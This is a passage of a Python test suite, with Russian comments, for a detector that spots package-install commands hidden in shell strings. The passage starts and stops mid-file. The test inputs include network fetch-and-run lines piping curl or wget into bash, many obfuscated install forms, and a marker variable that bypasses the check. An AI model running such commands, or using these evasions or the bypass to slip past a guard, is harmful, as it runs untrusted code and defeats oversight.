    def test_not_doubt(self):
        for cmd in ["sh -c 'make' " + "a " * 3000, "bash script.sh " + "a " * 3000, "eval " + "a " * 100,
                    "echo " + "a " * 3000, "git add " + "a " * 3000]:
            with self.subTest(cmd[:30]):
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_python_script_not_doubt(self):
        # `python` со скриптом или `-c` в видимых словах: слова за пределом — их аргументы, python пакет не ставит.
        for cmd in ["python3 gen.py " + "a " * 3000, "python -X dev -W error gen.py " + "a " * 3000,
                    "python3 -c 'print(1)' " + "a " * 3000, "python3 -Ic 'print(1)' " + "a " * 3000,
                    "python3 - " + "a " * 3000]:
            with self.subTest(cmd[:30]):
                self.assertIsNone(depcheck.dependency_doubt(cmd))
        # Одни флаги до предела или `-m`: модуль или пакет может стоять дальше.
        for cmd in ["python3 -X " + "a" * 5000 + " -m pip install x", "python3 -m pip install " + "-q " * 2000 + "x",
                    "python3 " + "-B " * 3000 + "-m pip install x"]:
            with self.subTest(cmd[:30]):
                self.assertEqual(depcheck.dependency_doubt(cmd)[1], depcheck._WHY_CUT)


class SudoLongFlagsTest(unittest.TestCase):
    """Флаги sudo со значением — короткие и длинные (`sudo --help`, sudo 1.9.17): значение не команда."""

    def test_detected(self):
        for cmd in ["sudo --user root npm install x", "sudo --user=root npm install x", "sudo -R / npm install x",
                    "sudo --chroot / npm i x", "sudo --chdir /app npm i x", "sudo --group g --host h npm i x",
                    "sudo --prompt p --close-from 3 npm i x", "sudo --command-timeout 5 npm i x",
                    "sudo --other-user u npm i x", "sudo -a t -c c npm i x", "sudo --role r --type t npm i x",
                    "sudo --login-class c --auth-type t npm i x"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in ["sudo --user root ls", "sudo -R / make"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))


class GemCommandFormsTest(unittest.TestCase):
    """RubyGems: псевдоним `i` и однозначные сокращения `install`; `--` кончает флаги gem."""

    def test_detected(self):
        for cmd in ["gem i rails", "gem ins rails", "gem inst rails", "gem instal rails",
                    "gem install rails -- --dry-run", "pip install x -- --dry-run"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        # `in` неоднозначно (`info`, `install`): gem отвечает ошибкой.
        for cmd in ["gem in rails", "gem info rails", "gem install --dry-run rails", "gem install rails --dry-run"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


class LineContinuationJoinTest(unittest.TestCase):
    """`\\` с переводом строки bash удаляет, не вставляя пробела: слова по краям склеиваются."""

    def test_detected(self):
        for cmd in ["pip ins\\\ntall requests", "n\\\npm install left-pad", "npm install \\\n  left-pad",
                    "echo x\\\n#y; npm i x", '"np\\\nm" install x', "sh -c 'n\\\npm i x'"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_comment_after_blank(self):
        self.assertIsNone(depcheck.dependency_add("echo a \\\n# npm i x"))


class ParameterExpansionSeparatorsTest(unittest.TestCase):
    """`#`, `;`, `&`, `|` внутри `${…}` вне кавычек — часть раскрытия, не комментарий и не граница команды."""

    def test_detected(self):
        for cmd in ["echo ${x:- #}; npm install left-pad", "echo ${x:-a|b}; npm i x", "echo ${x:-(}; npm i x"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in ["echo ${x:-a;npm install x}", "echo ${x:-a && npm i x}"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


class ParameterExpansionSubstitutionTest(unittest.TestCase):
    """Подстановка `$(…)` и `` `…` `` в слове `${…}` и в арифметике `$[…]` вне кавычек bash исполняет; `${…}`
    кончается на первой `}` вне кавычек: голые `{…}` в значении не вкладываются (bash 5.3)."""

    def test_detected(self):
        for cmd in ["echo ${x:-$(npm install y)}", "echo ${x:-`npm install y`}", "echo $[1+$(npm install y)]",
                    ": ${x:=$(npm install y)}", "echo ${x:-${y:-$(npm i z)}}", "echo ${x:-\"a\"$(npm i z)}",
                    "echo ${x:-{a,b}$(npm i z)}"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in ["echo ${x:-'$(npm i z)'}", "echo ${x:-$((1+2))} npm i z", "echo ${x:-\\$(npm i z)}",
                    "echo ${x:-a}$'$(npm i z)'", "echo $[1]'$(npm i z)'"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))


class SshOptionsAfterHostTest(unittest.TestCase):
    """OpenSSH разбирает флаги и после имени хоста; `--` кончает флаги."""

    def test_detected(self):
        for cmd in ["ssh host -p 22 npm install x", "ssh host -- npm install x", "ssh -o A=b host -t npm install x",
                    "ssh -- host npm i x", "ssh host -p 22 <<'EOF'\nnpm i x\nEOF"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in ["ssh host -p 22", "ssh host -t ls", "ssh host -- ls <<'EOF'\nnpm i x\nEOF"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


class AnsiCQuotingTest(unittest.TestCase):
    """`$'…'` раскрывает escape-последовательности bash."""

    def test_detected(self):
        for cmd in ["$'\\x6epm' install x", "$'\\156pm' install x", "$'\\u006epm' i x", "$'\\U0000006epm' i x",
                    "npm $'\\x69nstall' x", "$'n\\x70m' i x"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_decoding(self):
        for text, word in [("$'a\\tb'", "a\tb"), ("$'\\''", "'"), ("$'\\x'", "\\x"), ("$'\\q'", "\\q"),
                           ("$'\\cA'", "\x01"), ("$'a\\0b'", "a"), ("$'\\e'", "\x1b"), ("$'\\x41\\101'", "AA")]:
            with self.subTest(text):
                self.assertEqual(depcheck._split(text)[0][0], word)


class BraceExpansionTest(unittest.TestCase):
    """Фигурные скобки вне кавычек bash раскрывает в слова (`{a,b}`, `{1..3}`), кроме `${…}`, присваиваний и
    перенаправлений."""

    def test_detected(self):
        for cmd in ["{npm,install,left-pad}", "{npm,} install x", "npm install {left-pad,lodash}",
                    "npm {install,} x", "{npm,i} x", "npm i{,} x",
                    "npm install {" + "-D," * 100 + "left-pad}", '{"npm",install} x', "npm install {a..c}"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in ["echo {npm,install,x}", "mkdir -p src/{a,b}", "'{npm,install,x}'", "find . -exec rm {} \\;",
                    "echo ${X:-{npm,i}}", "{npm} install x", '"{npm,}" install x', "{'npm,'} install x",
                    "A={npm,install} x", "npm i > {a,b}", "npm run {build,test}"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))

    def test_words(self):
        for text, words in [("{a}{b,c}", ["{a}b", "{a}c"]), ("{a,b}{", ["a{", "b{"]), ("{a,b}}", ["a}", "b}"]),
                            ("a{b,c{d,e}f}g", ["abg", "acdfg", "acefg"]), ("{{a,b},c}", ["a", "b", "c"]),
                            ("{a,{b}}", ["a", "{b}"]), ("{a,b\\}c}", ["a", "b}c"]), ("{,}", []),
                            ("{a..e..2}", ["a", "c", "e"]), ("{3..1}", ["3", "2", "1"]),
                            ("{01..3}", ["01", "02", "03"]),
                            ("{a..}", ["{a..}"]), ("{-1..1}", ["-1", "0", "1"]), ("{1..2..0}", ["1", "2"]),
                            ('{a,"b,"c}', ["a", "b,c"]), ("x{a,b}${X}{c,d}", ["xa${X}c", "xa${X}d", "xb${X}c",
                                                                              "xb${X}d"])]:
            with self.subTest(text):
                self.assertEqual([w for w, _ in depcheck._split(text, braces=True)], words)

    def test_linear(self):
        for make in [lambda n: "{a,b}" * n + " npm i x", lambda n: "echo " + "{" * n, lambda n: "echo " + "{a}" * n,
                     lambda n: "npm i {" + "-D," * n + "x}", lambda n: "echo {1.." + "9" * n + "}",
                     lambda n: "echo " + "{" * n + "a,b" + "}" * n]:
            small, large = make(2000), make(8000)
            with self.subTest(small[:30]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))

    def test_budget_per_segment(self):
        # Предел _BRACE_BUDGET — на весь вызов: много слов с раскрытием не дороже текста той же длины.
        braced = "echo " + "{1..99}{1..99} " * 1000
        plain = "echo " + "abcdefghijklmn " * 1000
        assert_linear(self, lambda: depcheck.dependency_add(plain), lambda: depcheck.dependency_add(braced))

    def test_over_budget_doubt(self):
        # Слова за пределом раскрытия не видны, как за _WORDS_LIMIT: команда установки без видимого пакета — сомнение
        # со своим доводом.
        for cmd in ["npm {install,%s} x" % ("a" * 9000), "npm i {%s,b}{c,d}" % ("a" * 5000)]:
            with self.subTest(cmd[:30]):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertEqual(depcheck.dependency_doubt(cmd)[1], depcheck._WHY_BRACES)

    def test_over_budget_any_command_doubt(self):
        # Слова за пределом раскрытия не видны у любой команды: сомнение, обход — маркер.
        for cmd in ["for i in {1..10000}; do echo $i; done", "echo {a,b}{c,d}" * 2000, "touch f{1..5000}.txt"]:
            with self.subTest(cmd[:30]):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertEqual(depcheck.dependency_doubt(cmd)[1], depcheck._WHY_BRACES)
                self.assertIsNone(depcheck.dependency_doubt("PLANKA_DEP_OK=1 " + cmd))


class FunctionDefinitionTest(unittest.TestCase):
    """Тело функции `function f { …; }` и сопроцесса `coproc NAME { …; }` — команды."""

    def test_detected(self):
        for cmd in ["function f { npm install x; }; f", "coproc NAME { npm install x; }", "function f() { npm i x; }",
                    "coproc W while true; do npm i x; done"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in ["function npm { :; }", "coproc npm { :; }"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


class ArraySubscriptAssignmentTest(unittest.TestCase):
    """Присваивание элементу массива перед командой (`a[0]=1 cmd`) bash исполняет как присваивание."""

    def test_detected(self):
        # Индекс кончается на первой `]` вне кавычек и `\\` с учётом вложенных `[…]` (bash 5.3).
        for cmd in ["a[0]=1 npm install x", "a[1]+=x npm i x", 'a["k y"]=1 npm i x', "a[$i]=1 npm i x",
                    'a["]"]=1 npm install x', "a[']']=1 npm i x", "a[\\]]=1 npm i x", "a[b[1]]=1 npm i x"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_assignment(self):
        # Не присваивание: слово — имя команды, которой нет.
        for cmd in ["a[x]y]=1 npm i x", 'a[x]"="1 npm i x', "'a[0]=1' npm i x"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))

    def test_marker(self):
        self.assertIsNone(depcheck.dependency_add("a[0]=1 PLANKA_DEP_OK=1 npm i x"))


class SourceStdinTest(unittest.TestCase):
    """`source` и `.` со скриптом `-` или `/dev/stdin` исполняют stdin; со скриптом-файлом stdin — данные."""

    def test_detected(self):
        for cmd in ["source /dev/stdin <<< 'npm install x'", ". /dev/stdin <<EOF\nnpm install x\nEOF",
                    ". - <<<'npm i x'", "echo 'npm i x' | source /dev/stdin"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in ["echo 'npm i x' | source script.sh", "source script.sh <<< 'npm i x'",
                    "source s.sh <(echo npm i x)", ". s.sh <<'EOF'\nnpm i x\nEOF"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))


class FindPlaceholderTest(unittest.TestCase):
    """`{}` под `find -exec` — найденный путь: с начальной точкой поиска впереди (`./a.tgz`), у `-execdir` — `./`."""

    def test_not_adds(self):
        for cmd in ["find . -name '*.tgz' -exec npm install {} \\;", "find . -type d -execdir npm install {} \\;",
                    "find /opt -name '*.whl' -exec pip install {} +", "find -name '*.tgz' -exec npm i {} +",
                    "find src -name '*.whl' -exec pip install {} \\;", "find . -exec sh -c 'npm i {}' \\;",
                    # `$HOME`, `$PWD`, `$OLDPWD`, `$TMPDIR` — абсолютные пути, пустые — `/…`.
                    "find $HOME/x -name '*.tgz' -exec npm i {} +", 'find "$PWD" -exec npm i {} +',
                    "find ${TMPDIR}/p -exec npm i {} +"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))

    def test_detected(self):
        # npm читает `src/a` без `./` как репозиторий GitHub `src/a`. Значение `$DIR` неизвестно: путь может быть
        # таким же (README, «Известные ограничения»; обход — маркер).
        for cmd in ["find src -maxdepth 1 -type d -exec npm install {} \\;", "find . -exec npm i x {} \\;",
                    'find "$DIR" -exec npm i {} +', "find $HOMEDIR -exec npm i {} +"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))


class GitLaunchTest(unittest.TestCase):
    """Команды, которые git запускает из своих слов: `submodule foreach`, `bisect run`, `rebase -x/--exec`, псевдоним
    `-c alias.<имя>='!…'` (имя без учёта регистра)."""

    def test_detected(self):
        for cmd in ["git submodule foreach npm install x", "git submodule foreach 'npm i x'",
                    "git submodule --quiet foreach --recursive 'npm i x'", "git bisect run npm install x",
                    "git rebase -x 'npm i x' main", "git rebase --exec='npm i x' main", "git rebase -ix 'npm i x' main",
                    "git -C repo rebase --exec 'npm i x' main", "git rebase -x'npm i x' main",
                    "git -c alias.x='!npm i y' x", "git -c Alias.X='!npm' x i y",
                    "git --no-pager -c alias.t='!pip install r' T"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in ["git submodule foreach git pull", "git bisect run make test", "git rebase -x 'make test' main",
                    "git -c alias.x='!npm i y' status", "git -c alias.x='log' x", "git commit -m 'npm install x'",
                    "git rebase -s ours -x make main", "git rebase -C 3 main", "git -C x bisect start",
                    "PLANKA_DEP_OK=1 git submodule foreach npm i x", "git log --exec='npm i x'"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_doubt(self):
        self.assertEqual(depcheck.dependency_doubt("git submodule foreach 'eval $CMD'")[1], depcheck._WHY_COMPUTED)


class MinorFormsTest(unittest.TestCase):
    def test_detected(self):
        for cmd in ["fish --command 'npm install x'", "fish --command='npm install x'", "cmd /d /s /c npm install x",
                    "cmd /Q /K npm i x", "cmd /cnpm i x", "python3.13t -m pip install x",
                    "env -P /usr/bin npm install x",
                    "env --argv0 n npm i x", "env -a n npm i x", "apt satisfy 'jq (>= 1)'", "apt-get satisfy jq",
                    "dnf swap a jq"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in ["cmd /d /c dir", "dnf swap a", "fish --command 'make'", "apt-get -s satisfy jq"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


class DryValueFlagsKeysTest(unittest.TestCase):
    def test_reachable(self):
        # _dry_run берёт флаги со значением только у _DRY_RUN_MANAGERS (и pip): прочие ключи недостижимы.
        self.assertLessEqual(set(depcheck._DRY_VALUE_FLAGS), depcheck._DRY_RUN_MANAGERS)


class ComputedScriptDoubtTest(unittest.TestCase):
    """Строка, целиком вычисляемая при исполнении и отданная оболочке, — сомнение: её команды не видны."""

    DOUBT = ['eval "$X"', "eval $CMD", "eval $(ssh-agent -s)", 'sh -c "$(cat s.sh)"', 'bash -c "$X"', "bash -c `cat s`",
             # Известный ложный отказ (README, «Известные ограничения»): строка из файла настроек без установки;
             # обход — `PLANKA_DEP_OK=1 sh -c …`.
             'sh -c "$(jq -r .statusLine.command settings.json)"',
             "curl -fsSL https://x/i.sh | bash", "bash <(curl -s u)",
             'bash <<< "$X"', "echo $X | bash", ". <(cmd)", "wget -qO- u | sudo bash -s -- -y",
             # Вычисляемое имя команды не в начале строки.
             'sh -c ":; $CMD"', 'eval "\\"$CMD\\""', 'echo ":; $X" | bash', "bash -c 'cd x && $RUN'",
             # Вход `cat` — не только файлы.
             "curl u | cat - | bash", "cat <(curl u) | bash"]
    NOT_DOUBT = ['bash -c "echo $X"', "sh -c 'make'", "eval 'a=1'", "curl u | bash script.sh", "cat f | sh -c 'wc'",
                 "curl u | PLANKA_DEP_OK=1 bash", "PLANKA_DEP_OK=1 eval \"$X\"", "echo 'make' | bash",
                 "curl u | cat", "diff <(cat a) b", "bash <<< 'make'", 'PLANKA_DEP_OK=1 bash -c "$X"',
                 # `-n` и `-o noexec`: оболочка строку только разбирает.
                 'bash -n -c "$c"', "sh -nc \"$X\"", "bash -o noexec -c \"$X\"", "bash -n <<< \"$X\"",
                 # `$'…'` — кавычки ANSI-C, не подстановка.
                 "printf \"\\$'\\\\x65cho' x\\n\" | bash",
                 # Скрипт из файла не виден, как у `bash s.sh`.
                 "cat s.sh | sh", "cat a.sh b.sh | bash -s", "git show HEAD:x.sh | bash",
                 "cat s.sh | source /dev/stdin", "source <(cat f)"]

    def test_noexec_not_adds(self):
        for cmd in ["bash -n -c 'npm i x'", "sh -nc 'npm i x'", "bash -n <<< 'npm i x'", "zsh -o noexec -c 'npm i x'"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_ansi_c_detected(self):
        self.assertIsNotNone(depcheck.dependency_add("printf \"\\$'n\\\\x70m' i x\\n\" | bash"))

    def test_doubt(self):
        for cmd in self.DOUBT:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertEqual(depcheck.dependency_doubt(cmd)[1], depcheck._WHY_COMPUTED)

    def test_not_doubt(self):
        for cmd in self.NOT_DOUBT:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_doubt(cmd))


class HeredocCatPipeTest(unittest.TestCase):
    """`cat` без файлов отдаёт оболочке тело своего heredoc: тело уже разобрано командами, вход не вычисляемый."""

    def test_not_doubt(self):
        # `cat f` с heredoc читает файл, не stdin: скрипт из файла, как у `sh f`.
        for cmd in ["cat <<'EOF' | sh\nls\nEOF", "cat <<EOF | bash\necho hi\nEOF", "cat - <<EOF | sh\nls\nEOF",
                    "cat <<-EOF | bash -s\n\tmake\n\tEOF", "cat <<EOF f | sh\nls\nEOF"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_detected(self):
        for cmd in ["cat <<'EOF' | sh\nnpm i x\nEOF", "cat - <<EOF | bash\npip install requests\nEOF"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_doubt(self):
        # Вывод `cat -n` и вход `source`, у которого тело heredoc — данные, не видны.
        for cmd in ["cat -n <<EOF | sh\nls\nEOF", "cat <<EOF | source\nls\nEOF"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertEqual(depcheck.dependency_doubt(cmd)[1], depcheck._WHY_COMPUTED)


class UnknownLauncherDoubtTest(unittest.TestCase):
    """Неизвестная детектору программа, в чьих словах подряд стоят менеджер и его глагол установки, — сомнение:
    программа может запустить их командой."""

    DOUBT = ["direnv exec . npm install x", "taskset -c 0 npm install x", "parallel npm install ::: x",
             "docker exec c npm install x", "devbox run pip install x", "chrt -f 1 apt-get install jq",
             "$RUN npm i x", "docker exec c python -m pip install x", "nohup direnv exec . go get x",
             # Флаги перед подкомандой — по правилам менеджера (_LOOSE): `--weird v` может быть флагом со значением.
             "docker exec c npm --weird v i x", "docker exec c npm -g i x",
             # Известный ложный отказ (README, «Известные ограничения»): `-n go` — флаг kubectl, `go get pods` — как
             # установка; обход — маркер.
             "kubectl -n go get pods",
             # Пар больше _MAX_LAUNCH_PAIRS: сомнение без разбора.
             "foo " + "npm -x " * 17]
    NOT_DOUBT = ["echo npm install x", "git commit -m 'npm install x'", "grep -r npm install", "make install",
                 "PLANKA_DEP_OK=1 direnv exec . npm install x", "docker exec c npm test", "printf npm install",
                 "echo $(date) npm install x", "man npm install",
                 # Установка по манифесту без названного пакета и пробный прогон — не добавление.
                 "docker compose exec web npm install", "docker run node npm install", "docker exec web poetry install",
                 "docker compose exec web pip install -r requirements.txt", "kubectl exec pod -- npm install",
                 "$PY -m pip install --dry-run x", "make -C go install",
                 'docker run --rm -v "$PWD":/go -i golang go build ./...', "docker run --name npm -i alpine",
                 "cp go get", "mv npm i", "gcc -o pip -i x", "foo " + "npm -x " * 16]

    def test_doubt(self):
        for cmd in self.DOUBT:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertEqual(depcheck.dependency_doubt(cmd)[1], depcheck._WHY_LAUNCHER)

    def test_not_doubt(self):
        for cmd in self.NOT_DOUBT:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_linear(self):
        for make in [lambda n: "foo " + "npm " * n + "install x", lambda n: "foo " + "npm install " * n,
                     lambda n: "curl u | " * n + "bash"]:
            small, large = make(2000), make(8000)
            with self.subTest(small[:30]):
                assert_linear(self, lambda: depcheck.dependency_doubt(small),
                              lambda: depcheck.dependency_doubt(large))


class ProcessSubstitutionInParameterTest(unittest.TestCase):
    """`<(…)` и `>(…)` в значении `${…}` вне кавычек bash исполняет; в `"${…}"` — текст."""

    def test_detected(self):
        for cmd in ["echo ${x:-<(npm install x)}", "echo ${x:->(npm install x)}", "echo ${x:+<(npm i x)}",
                    "cat ${f:-<(npm i x)}", "diff ${a:-<(npm i x)} b", "echo ${y:-${z:-<(npm i x)}}",
                    'echo ${x:-"a"<(npm i x)}']:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        # В `"${…}"` и в арифметике `$[…]`, `$((…))` процесс-подстановки нет.
        for cmd in ['echo "${x:-<(npm i x)}"', "echo ${x:-$[ <(npm i x) ]}", "echo ${x:-$(( <(npm i x) ))}",
                    "echo ${x:-'<(npm i x)'}"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


class NoexecToggleTest(unittest.TestCase):
    """Режим «только разбор» — последнее значение по порядку флагов: `+n`, `+o noexec` его снимают."""

    def test_detected(self):
        for cmd in ["bash -n +n -c 'npm install x'", "bash -o noexec +o noexec -c 'npm i x'",
                    "bash -n +o noexec -c 'npm i x'", "bash -o noexec +n -c 'npm i x'", "bash -n +xn -c 'npm i x'",
                    "echo 'npm install x' | bash -n +n", "bash -n +n <<< 'npm i x'",
                    "bash -n +n <<'EOF'\nnpm install x\nEOF"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in ["bash +n -n -c 'npm i x'", "bash +n -o noexec -c 'npm i x'", "echo 'npm i x' | bash +n -n",
                    "bash +o noexec -n <<'EOF'\nnpm install x\nEOF"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))


class ArithmeticSubstitutionTest(unittest.TestCase):
    """Подстановка внутри `$((…))` в двойных кавычках, в `${…}` и в теле heredoc исполняется; кавычки внутри
    арифметики её не прячут."""

    def test_detected(self):
        for cmd in ['echo "$(( $(npm install x) + 1 ))"', 'echo "$(( `npm i x` ))"',
                    "cat <<EOF\n$(( $(npm install x) ))\nEOF", "echo ${y:-$(( $(npm i x) ))}",
                    'echo "$(( "$(npm i x)" + 1 ))"', "echo \"$(( '$(npm i x)' ))\"",
                    'echo "$(( (1) + $(npm i x) ))"', 'echo "$(( $(( 1 )) + $(npm i x) ))"',
                    "echo ${x:-$(( '$(npm i x)' ))}"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_subshell_fallback(self):
        # `$((` и `((`, где `)` нулевой глубины стоит не перед второй `)`, bash 5.3 читает подстановкой `$(` или
        # подоболочкой `(` с подоболочкой внутри.
        for cmd in ['echo "$((npm install evil) )"', "echo ${y:-$((npm install evil) )}",
                    "cat <<EOF\n$((npm install evil) )\nEOF", 'echo "$((cd /tmp && npm install evil); true)"',
                    "echo $((npm install evil) )", 'echo "$((a) )"; npm i x', 'echo "$((a) )" && npm i x',
                    "echo \"$((echo '$(true)') )\"; npm i x", 'echo "$(( (a) ) )"; npm i x']:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_subshell_fallback_quotes(self):
        # Тело `$(` после отката — команда: `'…'` в нём прячет подстановку, как в bash.
        self.assertEqual(depcheck._quoted_substitutions("echo \"$((echo '$(npm i x)') )\""),
                         ["(echo '$(npm i x)') "])
        self.assertIsNone(depcheck.dependency_add("echo \"$((echo '$(npm i x)') )\""))

    def test_subshell_fallback_heredoc(self):
        # `((` с подоболочкой: `<<` после её конца — heredoc.
        self.assertEqual(depcheck.heredocs("((true) ) <<EOF"), [("EOF", False)])
        self.assertEqual(depcheck.heredocs("(( x << 2 ))"), [])

    def test_not_adds(self):
        # После `))` арифметики в `"…"` снова двойные кавычки: `'` — символ.
        for cmd in ['echo "$(( 1 + 2 ))"', "echo \"$(( 1 ))'\" 'npm i x'", "cat <<EOF\n$(( 1 + 2 ))\nEOF",
                    'echo "$((1) )"', "echo \"$((echo a) )'\" 'npm i x'"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))

    def test_linear(self):
        for make in [lambda n: 'echo "' + "$(( " * n + "1" + " ))" * n + '"',
                     lambda n: 'echo "' + "$(( (" * n + "1" + ") ))" * n + '"']:
            small, large = make(1000), make(4000)
            with self.subTest(small[:30]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))


class BraceBudgetPerCallTest(unittest.TestCase):
    """Предел раскрытия фигурных скобок _BRACE_BUDGET — один на вызов dependency_add и dependency_doubt: общий для
    всех сегментов и вложенных строк."""

    def test_linear(self):
        for make in [lambda n: "echo {1..99}{1..99}; " * n, lambda n: "echo {1..99}{1..99}\n" * n,
                     lambda n: "echo {1..99}{1..99} | " * n + "cat",
                     lambda n: "echo " + "$(echo {1..99}{1..99}) " * n,
                     lambda n: "bash -c 'echo {1..99}{1..99}; " * n + "'"]:
            small, large = make(250), make(1000)
            with self.subTest(small[:30]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
                assert_linear(self, lambda: depcheck.dependency_doubt(small),
                              lambda: depcheck.dependency_doubt(large))

    def test_cost_of_plain_text(self):
        # Раскрытие во многих сегментах не дороже текста той же длины без скобок больше, чем на сам предел.
        braced = "echo {1..99}{1..99}; " * 2000
        plain = "echo abcdefghijklm; " * 2000
        assert_linear(self, lambda: depcheck.dependency_doubt(plain), lambda: depcheck.dependency_doubt(braced))

    def test_exhausted_doubt(self):
        # Предел кончился в прошлом сегменте: пакет в скобках дальше не виден — сомнение со своим доводом.
        for cmd in ["echo {1..99}{1..99}; npm install {x,y}", "npm install {--a{1..99}{1..99},x}",
                    "echo {1..99}{1..99} && bash -c 'npm i {x,y}'"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertEqual(depcheck.dependency_doubt(cmd)[1], depcheck._WHY_BRACES)

    def test_after_exhausted(self):
        # Слова без скобок предел не тратят: установка за исчерпанным пределом видна.
        for cmd in ["echo {1..99}{1..99}; npm install x", "echo {1..99}{1..99}; npm i x{,}"]:
            with self.subTest(cmd):
                self.assertTrue(depcheck.dependency_add(cmd) or depcheck.dependency_doubt(cmd))
        self.assertIsNotNone(depcheck.dependency_add("echo {1..99}{1..99}; npm install x"))

    def test_exhausted_hidden_command(self):
        # Предел кончился до слова команды, подкоманды или команды за запускателем: они не видны — сомнение.
        spent = "echo {1..99}{1..99}; "
        for tail in ["{npm,install,evil}", "{bash,-c,'npm install evil'}", "{npm,i} evil", "n{p,}m install evil",
                     "npm {install,} evil", "{sudo,} npm i evil", "env {A=1,} npm i evil", "{eval,'npm i evil'}",
                     "pip {install,} x", "npx {pnpm,} add x"]:
            with self.subTest(tail):
                self.assertIsNone(depcheck.dependency_add(spent + tail))
                self.assertEqual(depcheck.dependency_doubt(spent + tail)[1], depcheck._WHY_BRACES)

    def test_exhausted_any_command(self):
        # Предел кончился в прошлом сегменте (с маркером): слова со скобками дальше не видны у любой команды —
        # сомнение у этого сегмента, в том числе когда флаг со значением съел бы глагол хвоста.
        spent = "PLANKA_DEP_OK=1 echo {1..99}{1..99}; "
        for tail in ["touch f{1..9}.txt", "mkdir -p {a,b}", "echo {a,b}", "yarn --cwd {d,} add x",
                     "uv --directory {d,} add x", "uv --project {d,} pip install x", "poetry -C {d,} add x",
                     "composer --working-dir {d,} require x", "npx --cache {d,} npm i x", "dotnet {add,} package x",
                     "dotnet add {package,} x", "dotnet {tool,} install x", "dart {pub,} add x",
                     "flutter {pub,} add x", "swift {package,} add-dependency x", "swift package {add-dependency,} x",
                     "pacman {-S,} x", "nix-env {-i,} x", "python {-m,} pip install x"]:
            with self.subTest(tail):
                self.assertIsNone(depcheck.dependency_add(spent + tail))
                self.assertEqual(depcheck.dependency_doubt(spent + tail), (tail, depcheck._WHY_BRACES))
        self.assertIsNone(depcheck.dependency_doubt(spent + "ls"))

    def test_same_segment_twice(self):
        # Сегмент, который разбор читает несколько раз, тратит предел один раз: без ложного сомнения.
        cmd = "cat <<EOF | bash -s {1..40}{1..40}\nls\nEOF"
